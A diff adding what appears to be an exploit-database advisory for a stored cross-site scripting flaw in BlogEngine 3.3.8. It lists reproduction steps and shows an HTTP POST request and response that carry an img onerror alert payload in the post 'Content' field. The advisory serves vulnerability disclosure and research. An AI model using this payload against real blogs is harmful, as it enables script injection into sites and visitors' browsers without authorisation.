@@ -1,0 +1,44 @@
+# Exploit Title: BlogEngine 3.3.8 - 'Content' Stored XSS
+# Date: 11/2020
+# Exploit Author: Andrey Stoykov
+# Vendor Homepage: https://blogengine.io/
+# Software Link: https://github.com/BlogEngine/BlogEngine.NET/releases/download/v3.3.8.0/3380.zip
+# Version: 3.3.8
+# Tested on: Windows Server 2016
+# Exploit and Detailed Info: https://infosecresearchlab.blogspot.com/2020/11/blogengine-338-stored-xss.html
+
+
+Stored XSS Reproduction Steps:
+
+1. Login http://IP/blogengine/admin/app/editor/editpost.cshtml
+2. Add content and trap POST request into intercepting proxy
+3. Add the XSS payload into the "Content" parameter value
+4. Browse to the post to trigger the XSS payload
+
+
+Example HTTP POST Request:
+POST /blogengine/api/posts HTTP/1.1
+Host: 192.168.56.6
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+[..]
+{
+  "Id": "",
+  "Title": "XSS Test",
+  "Author": "Admin",
+  "Content": "<img src=x onerror=alert(`XSS`)>",
+  [..]
+  }
+
+Example HTTP Response:
+HTTP/1.1 201 Created
+Cache-Control: no-cache
+[..]
+{
+  "IsChecked": false,
+  "Id": "357ae13d-f230-486a-b2aa-71d67a700083",
+  "Title": "XSS Test",
+  "Author": "Admin",
+  "Description": "",
+  "Content": "<img src=x onerror=alert(`XSS`)>",
+  [..]
+ }
